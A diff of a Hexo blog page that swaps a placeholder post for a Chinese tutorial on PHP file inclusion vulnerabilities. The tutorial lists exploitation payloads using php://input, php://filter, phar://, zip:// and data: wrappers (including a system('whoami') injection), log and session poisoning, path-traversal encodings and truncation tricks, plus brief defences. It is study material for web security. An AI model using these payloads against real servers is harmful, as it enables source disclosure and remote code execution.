@@ -19,7 +19,9 @@
 
   <!-- 页面元数据 -->
   
-  <title>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aliquam justo turpis, tincidunt ac convallis id. - cances</title>
+  <title>php文件包含 - cances</title>
+  
+    <meta name="keywords" content="php,web">
   
 
   
@@ -447,7 +449,7 @@
     
     
       <h1 class="title">
-        Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aliquam justo turpis, tincidunt ac convallis id.
+        php文件包含
       </h1>
       <div class='new-meta-box'>
         
@@ -460,7 +462,7 @@
             <div class="new-meta-item date">
   <a class='notlink'>
     <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：2013年12月24日</p>
+    <p>发布于：2019年2月10日</p>
   </a>
 </div>
 
@@ -471,7 +473,7 @@
   <div class="new-meta-item browse leancloud">
     <a class='notlink'>
       
-      <div id="lc-pv" data-title="Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aliquam justo turpis, tincidunt ac convallis id." data-path="/2013/12/24/long-title/">
+      <div id="lc-pv" data-title="php文件包含" data-path="/2019/02/10/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
         <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
         <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
         次浏览
@@ -488,7 +490,212 @@
 
 
   
-  <p>This post has a long title. Make sure the title displayed right.</p>
+  <h1 id="本地文件包含的利用思路"><a href="#本地文件包含的利用思路" class="headerlink" title="本地文件包含的利用思路"></a>本地文件包含的利用思路</h1><ol>
+<li>通过日志写入任意代码进行包含攻击</li>
+<li>利用上传点，上传正常文件包含webshell脚本</li>
+<li>LFI With PHPInfo Assistance</li>
+<li>包含session(默认php安装配置，获取sesion文件名)</li>
+</ol>
+<h1 id="php文件包含"><a href="#php文件包含" class="headerlink" title="php文件包含"></a>php文件包含</h1><p>php的文件包含函数：</p>
+<ol>
+<li>include()</li>
+<li>include_once()</li>
+<li>require()</li>
+<li>require_once()</li>
+</ol>
+<blockquote>
+<p>reuqire() 如果在包含的过程中有错，比如文件不存在等，则会直接退出，不执行后续语句。</p>
+</blockquote>
+<blockquote>
+<p>include() 如果出错的话，只会提出警告，会继续执行后续语句。</p>
+</blockquote>
+<p>当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。</p>
+<p>可能存在文件包含漏洞的必要条件：</p>
+<ol>
+<li>具有文件包含函数。</li>
+<li>文件包含函数中存在动态变量。</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>攻击者能够控制该变量。</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br></pre></td></tr></table></figure>
+<h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><h2 id="LFI-Local-File-Inclusion"><a href="#LFI-Local-File-Inclusion" class="headerlink" title="LFI(Local File Inclusion)"></a>LFI(Local File Inclusion)</h2><p>本地文件包含漏洞，是指能打开并包含本地文件的漏洞。</p>
+<h2 id="RFI-Remote-File-Inclusion"><a href="#RFI-Remote-File-Inclusion" class="headerlink" title="RFI(Remote File Inclusion)"></a>RFI(Remote File Inclusion)</h2><p>远程文件包含漏洞。是指能够远程包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害和很大。</p>
+<p>但RFI的利用条件较为苛刻，需要php.ini中进行配置：</p>
+<blockquote>
+<p>allow_url_fopen = On<br>allow_url_include = On</p>
+</blockquote>
+<p>两个配置选项均需要为On，才能远程包含文件成功。</p>
+<blockquote>
+<p>在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认Off。</p>
+</blockquote>
+<h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>利用条件：</p>
+<ol>
+<li>allow_url_include = On。</li>
+<li>对allow_url_fopen不做要求。</li>
+</ol>
+<p>利用方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>利用条件：</p>
+<p>无</p>
+<p>利用方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?</span><br><span class="line">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>
+<p>^</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?</span><br><span class="line">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>可以直接读取经过base64加密后的文件源码。</p>
+</blockquote>
+<h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>利用条件：</p>
+<p>php版本大于等于5.3.0</p>
+<p>利用方法：</p>
+<p>将php文件打包成zip压缩包，然后</p>
+<p>指定绝对路径：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file+phar:&#x2F;&#x2F;D:&#x2F;phpStudy&#x2F;WWW&#x2F;test.zip&#x2F;test.php</span><br></pre></td></tr></table></figure>
+<p>或者相对路径：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file&#x3D;phar:&#x2F;&#x2F;test.zip&#x2F;test.php</span><br></pre></td></tr></table></figure>
+<h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p>利用条件：</p>
+<p>php版本大于等于5.3.0</p>
+<p>利用方法：</p>
+<p>构造zip包</p>
+<p>然后指定绝对路径，同时将<code>#</code>编码为<code>%23</code>，之后填上压缩包内的文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file&#x3D;zip:&#x2F;&#x2F;D:\phpStudy\WWW\test.zip%23test.php</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>使用相对路径会包含失败。</p>
+</blockquote>
+<h3 id="data-URI-schema"><a href="#data-URI-schema" class="headerlink" title="data:URI schema"></a>data:URI schema</h3><p>利用条件：</p>
+<ol>
+<li>php版本大于等于php5.2.0</li>
+<li>allow_url_fopen = On</li>
+<li>allow_url_include = On</li>
+</ol>
+<p>利用方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file&#x3D;data:text&#x2F;plain,&lt;?php system(&#39;whoami&#39;);?&gt;</span><br></pre></td></tr></table></figure>
+<p>^</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file&#x3D;data:text;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>
+
+
+<p>加号+的url编码为<code>%2b</code>，<code>PD9waHAgcGhwaW5mbygpOz8%2b</code>的base64解码为：<code>&lt;?php phpinfo();?&gt;</code>。</p>
+<h3 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h3><p>利用条件：</p>
+<ol>
+<li>session文件路径已知</li>
+<li>session文件内容可控</li>
+</ol>
+<blockquote>
+<p>php的session文件的保存路径可以在phpinfo的session.save_path看到。</p>
+</blockquote>
+<p>常见的php-session存放位置：</p>
+<ol>
+<li>/var/lib/php/sess_PHPSESSID</li>
+<li>/var/lib/php/sess_PHPSESSID</li>
+<li>/tmp/sess_PHPSESSID</li>
+<li>/tmp/sessions/sess_PHPSESSID</li>
+</ol>
+<p>session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到。</p>
+<h3 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h3><h4 id="访问日志"><a href="#访问日志" class="headerlink" title="访问日志"></a>访问日志</h4><p>利用条件：</p>
+<ol>
+<li>服务器日志文件路径已知</li>
+<li>服务器日志文件可读</li>
+</ol>
+<p>利用方式：</p>
+<p>使用burp截包后修改。</p>
+<blockquote>
+<p>很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。</p>
+</blockquote>
+<h4 id="ssh日志"><a href="#ssh日志" class="headerlink" title="ssh日志"></a>ssh日志</h4><p>利用条件：</p>
+<ol>
+<li>ssh日志位置已知</li>
+<li>ssh日志可读</li>
+</ol>
+<blockquote>
+<p>日志位置默认情况下为 /var/log/auth.log</p>
+</blockquote>
+<p>利用方式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-207-93-ubuntu:~$ ssh &#39;&lt;?php phpinfo(); ?&gt;&#39;@remotehost</span><br></pre></td></tr></table></figure>
+<h4 id="包含environ"><a href="#包含environ" class="headerlink" title="包含environ"></a>包含environ</h4><p>利用条件：</p>
+<ol>
+<li>php以cgi方式运行，这样environ才会保存UA头。</li>
+<li>environ文件存储位置已知，且environ文件可读。</li>
+</ol>
+<p>利用方式：</p>
+<p>proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p>
+<h4 id="包含上传文件"><a href="#包含上传文件" class="headerlink" title="包含上传文件"></a>包含上传文件</h4><p>利用条件：</p>
+<ol>
+<li>文件上传路径</li>
+<li>文件名</li>
+</ol>
+<p>利用方式：</p>
+<p>文件上传</p>
+<h1 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h1><h2 id="指定前缀"><a href="#指定前缀" class="headerlink" title="指定前缀"></a>指定前缀</h2><p>服务器代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;/var/www/html/&#x27;</span>.<span class="variable">$file</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>利用../或..\</p>
+<p>编码绕过：</p>
+<ul>
+<li>利用URL编码<ul>
+<li>../<ul>
+<li>%2e%2e%2f</li>
+</ul>
+</li>
+<li>..\<ul>
+<li>%2e%2e%5c</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>二次编码<ul>
+<li>../<ul>
+<li>%252e%252e%252f</li>
+</ul>
+</li>
+<li>..\<ul>
+<li>%252e%252e%255c</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>容器或服务器的编码方式<ul>
+<li>../<ul>
+<li>%252e%252e%255c<ul>
+<li><a target="_blank" rel="noopener" href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work">Why does Directory traversal attack %C0%AF work?</a></li>
+</ul>
+</li>
+<li>%c0%ae%c0%ae/<ul>
+<li>java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）</li>
+<li>Apache Tomcat Directory Traversal</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>..\<ul>
+<li>..%c1%9c</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="指定后缀"><a href="#指定后缀" class="headerlink" title="指定后缀"></a>指定后缀</h2><p>服务器代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>.<span class="string">&#x27;/test/test.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="利用URL特殊符号"><a href="#利用URL特殊符号" class="headerlink" title="利用URL特殊符号"></a>利用URL特殊符号</h3><h4 id="query"><a href="#query" class="headerlink" title="query(?)"></a>query(?)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file&#x3D;http:&#x2F;&#x2F;remoteaddr&#x2F;remoteinfo.txt?</span><br></pre></td></tr></table></figure>
+<p>则包含的文件为 <code>http://remoteaddr/remoteinfo.txt?/test/test.php</code></p>
+<h4 id="fragment"><a href="#fragment" class="headerlink" title="fragment(#)"></a>fragment(#)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file&#x3D;http:&#x2F;&#x2F;remoteaddr&#x2F;remoteinfo.txt%23</span><br></pre></td></tr></table></figure>
+<p>则包含的文件为 <code>http://remoteaddr/remoteinfo.txt#/test/test.php</code></p>
+<blockquote>
+<p>注意需要把#进行url编码为%23。</p>
+</blockquote>
+<h3 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h3><p>利用zip协议，注意要指定绝对路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file&#x3D;zip:&#x2F;&#x2F;D:\phpStudy\WWW\fileinclude\chybeta.zip%23chybeta</span><br></pre></td></tr></table></figure>
+<p>则拼接后为：zip://D:\phpStudy\WWW\fileinclude\chybeta.zip#chybeta/test/test.php</p>
+<h3 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h3><p>利用条件：</p>
+<p>php版本小于5.2.8</p>
+<p>目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复<code>./</code>，则后缀<code>/test/test.php</code>，在达到最大值后会被直接丢弃掉。</p>
+<h3 id="0字节截断"><a href="#0字节截断" class="headerlink" title="0字节截断"></a>0字节截断</h3><p>利用条件：<br>php版本小于5.3.4</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file&#x3D;phpinfo.txt%00</span><br></pre></td></tr></table></figure>
+<h1 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h1><ol>
+<li>在很多场景中都需要去包含web目录之外的文件，如果php配置了open_basedir，则会包含失败</li>
+<li>做好文件的权限管理</li>
+<li>对危险字符进行过滤等等</li>
+</ol>
 
   
   
@@ -506,7 +713,7 @@
               
             
               
-                <p>本文永久链接是：<a href=https://canc3s.github.io/2013/12/24/long-title/>https://canc3s.github.io/2013/12/24/long-title/</a></p>
+                <p>本文永久链接是：<a href=https://canc3s.github.io/2019/02/10/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/>https://canc3s.github.io/2019/02/10/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</a></p>
               
             
           </blockquote>
@@ -524,6 +731,9 @@
       
         
           
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/php/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>php</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/web/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>web</p></a></div>
+
 
         
       
@@ -535,7 +745,7 @@
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://canc3s.github.io/2013/12/24/long-title/&title=Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aliquam justo turpis, tincidunt ac convallis id. - cances&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://canc3s.github.io/2019/02/10/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/&title=php文件包含 - cances&summary="
           
           >
           
@@ -547,7 +757,7 @@
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://canc3s.github.io/2013/12/24/long-title/&title=Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aliquam justo turpis, tincidunt ac convallis id. - cances&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://canc3s.github.io/2019/02/10/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/&title=php文件包含 - cances&summary="
           
           >
           
@@ -559,7 +769,7 @@
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=https://canc3s.github.io/2013/12/24/long-title/&title=Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aliquam justo turpis, tincidunt ac convallis id. - cances&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=https://canc3s.github.io/2019/02/10/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/&title=php文件包含 - cances&summary="
           
           >
           
@@ -571,7 +781,7 @@
       
         <a class="-mob-share-telegram" title="" rel="external nofollow noopener noreferrer noopener"
           
-            target="_blank" href="https://t.me/share/url?url=https://canc3s.github.io/2013/12/24/long-title/&text=Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aliquam justo turpis, tincidunt ac convallis id. - cances"
+            target="_blank" href="https://t.me/share/url?url=https://canc3s.github.io/2019/02/10/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/&text=php文件包含 - cances"
           
           >
           
@@ -597,18 +807,16 @@
   
     <div class="prev-next">
       
-        <a class='prev' href='/2013/12/24/%E4%B8%AD%E6%96%87%E6%B8%AC%E8%A9%A6/'>
-          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>中文測試</p>
-          <p class='content'>This is a Chinese test post.
-善我王上魚、產生資西員合兒臉趣論。畫衣生這著爸毛親可時，安程幾？合學作。觀經而作建。都非子作這！法如言子你關！手師也。
-以也座論頭室業放...</p>
+        <a class='prev' href='/2020/12/23/hello-world/'>
+          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>Hello World</p>
+          <p class='content'>Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any ...</p>
         </a>
       
       
-        <a class='next' href='/2013/12/24/link-post/'>
-          <p class='title'>Link Post<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>This is a link post. Clicking on the link should open Google in a new tab or window.
-</p>
+        <a class='next' href='/2019/01/06/CVE-%E7%88%AC%E8%99%AB/'>
+          <p class='title'>CVE 爬虫<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>Python3爬国家漏洞信息库思路流程先确定要爬的网站并观察他URL的规律发现，当url为：
+1https:&#x2F;&#x2F;nvd.nist.gov&#x2F;vuln&#x2F;ful...</p>
         </a>
       
     </div>
@@ -641,6 +849,20 @@
 
 
 
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#LFI-Local-File-Inclusion"><span class="toc-text">LFI(Local File Inclusion)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RFI-Remote-File-Inclusion"><span class="toc-text">RFI(Remote File Inclusion)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">php伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php-input"><span class="toc-text">php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-filter"><span class="toc-text">php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar"><span class="toc-text">phar:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zip"><span class="toc-text">zip:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#data-URI-schema"><span class="toc-text">data:URI schema</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E5%90%ABsession"><span class="toc-text">包含session</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97"><span class="toc-text">包含日志</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E6%97%A5%E5%BF%97"><span class="toc-text">访问日志</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ssh%E6%97%A5%E5%BF%97"><span class="toc-text">ssh日志</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8C%85%E5%90%ABenviron"><span class="toc-text">包含environ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-text">包含上传文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80"><span class="toc-text">指定前缀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80"><span class="toc-text">指定后缀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8URL%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7"><span class="toc-text">利用URL特殊符号</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#query"><span class="toc-text">query(?)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fragment"><span class="toc-text">fragment(#)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8D%8F%E8%AE%AE"><span class="toc-text">利用协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD"><span class="toc-text">长度截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0%E5%AD%97%E8%8A%82%E6%88%AA%E6%96%AD"><span class="toc-text">0字节截断</span></a></li></ol></li></ol>
+    </div>
+  </section>
+
 
   
 
@@ -657,7 +879,7 @@
 <script>
   window.pdata={}
   pdata.ispage=true;
-  pdata.postTitle="Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aliquam justo turpis, tincidunt ac convallis id.";
+  pdata.postTitle="php文件包含";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
 
